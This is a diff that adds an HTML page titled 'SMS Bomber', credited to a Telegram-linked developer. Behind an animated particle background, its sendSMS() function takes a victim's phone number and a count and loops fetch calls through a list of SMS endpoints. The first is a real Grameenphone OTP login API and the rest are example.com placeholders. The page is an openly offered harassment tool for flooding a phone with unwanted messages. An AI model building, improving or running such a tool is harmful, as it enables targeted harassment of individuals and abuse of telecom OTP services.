@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Bomber</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background: black;
+            overflow: hidden;
+        }
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: -1;
+        }
+        .container {
+            width: 400px;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 15px lime;
+            text-align: center;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        h2 {
+            font-size: 28px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            animation: rainbow 2s linear infinite;
+        }
+        @keyframes rainbow {
+            0% { color: red; }
+            20% { color: orange; }
+            40% { color: yellow; }
+            60% { color: lime; }
+            80% { color: cyan; }
+            100% { color: red; }
+        }
+        input, button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+        }
+        input {
+            background: #111;
+            color: lime;
+            border: 1px solid lime;
+        }
+        button {
+            background: lime;
+            color: black;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background: darkgreen;
+        }
+        .footer {
+            position: fixed;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: white;
+            font-size: 16px;
+        }
+        .footer a {
+            color: lime;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 🔥 Moving Dots Background -->
+    <canvas id="background"></canvas>
+
+    <!-- 🔥 SMS Bomber Form -->
+    <div class="container">
+        <h2>🔥 SMS Bomber</h2>
+        <input type="text" id="phoneNumber" placeholder="Enter Phone Number">
+        <input type="number" id="amount" placeholder="Enter Amount (1-100)" min="1" max="100">
+        <button onclick="sendSMS()">Start Bombing</button>
+    </div>
+
+    <!-- 🔥 Developer Credit -->
+    <div class="footer">
+        Developer: <a href="https://t.me/RS_CYBER_TEAM" target="_blank">RS RABBY</a>
+    </div>
+
+    <script>
+        const canvas = document.getElementById("background");
+        const ctx = canvas.getContext("2d");
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        let particles = [];
+
+        class Particle {
+            constructor() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.radius = 3;
+                this.speedX = (Math.random() - 0.5) * 2;
+                this.speedY = (Math.random() - 0.5) * 2;
+            }
+            update() {
+                this.x += this.speedX;
+                this.y += this.speedY;
+                if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
+                if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
+            }
+            draw() {
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+                ctx.fillStyle = "#0f0";
+                ctx.fill();
+            }
+        }
+
+        function init() {
+            particles = [];
+            for (let i = 0; i < 100; i++) {  // 🔥 ডট সংখ্যা বাড়ানো হয়েছে
+                particles.push(new Particle());
+            }
+        }
+
+        function animate() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            for (let i = 0; i < particles.length; i++) {
+                particles[i].update();
+                particles[i].draw();
+                for (let j = i + 1; j < particles.length; j++) {
+                    const dx = particles[i].x - particles[j].x;
+                    const dy = particles[i].y - particles[j].y;
+                    const distance = Math.sqrt(dx * dx + dy * dy);
+                    if (distance < 100) {
+                        ctx.beginPath();
+                        ctx.moveTo(particles[i].x, particles[i].y);
+                        ctx.lineTo(particles[j].x, particles[j].y);
+                        ctx.strokeStyle = "#0f03";
+                        ctx.lineWidth = 1;
+                        ctx.stroke();
+                    }
+                }
+            }
+            requestAnimationFrame(animate);
+        }
+
+        // 🔥 ক্লিক করলে ডট দূরে সরে যাবে ✅
+        canvas.addEventListener("click", (event) => {
+            const clickX = event.clientX;
+            const clickY = event.clientY;
+            particles.forEach(p => {
+                const dx = p.x - clickX;
+                const dy = p.y - clickY;
+                const distance = Math.sqrt(dx * dx + dy * dy);
+                if (distance < 100) {
+                    p.speedX = (Math.random() - 0.5) * 5;
+                    p.speedY = (Math.random() - 0.5) * 5;
+                }
+            });
+        });
+
+        init();
+        animate();
+
+        // 🔥 Multiple API Support (10+ API সাপোর্ট ✅)
+        const apiList = [
+            "https://webloginda.grameenphone.com/backend/api/v1/otp",
+            "https://api2.example.com/send?phone=",
+            "https://api3.example.com/send_sms?to=",
+            "https://api4.example.com/api/sms?num=",
+            "https://api5.example.com/sms/send?mobile=",
+            "https://api6.example.com/sendMessage?phone=",
+            "https://api7.example.com/text?receiver=",
+            "https://api8.example.com/sms/send?number=",
+            "https://api9.example.com/notify?phone=",
+            "https://api10.example.com/sms/send?recipient="
+        ];
+
+        function sendSMS() {
+            let phone = document.getElementById("phoneNumber").value;
+            let amount = document.getElementById("amount").value;
+
+            if (!phone || !amount) {
+                alert("Please enter phone number and amount!");
+                return;
+            }
+            if (amount < 1 || amount > 100) {
+                alert("Amount must be between 1 and 100");
+                return;
+            }
+
+            for (let i = 0; i < amount; i++) {
+                let api = apiList[i % apiList.length];  // 🔥 API গুলো রোটেট হবে
+                fetch(`${api}${phone}&msg=Test+Message`)
+                .then(response => console.log(`SMS ${i+1} sent to ${phone}`))
+                .catch(error => console.error("Error:", error));
+            }
+        }
+    </script>
+</body>
+</html>
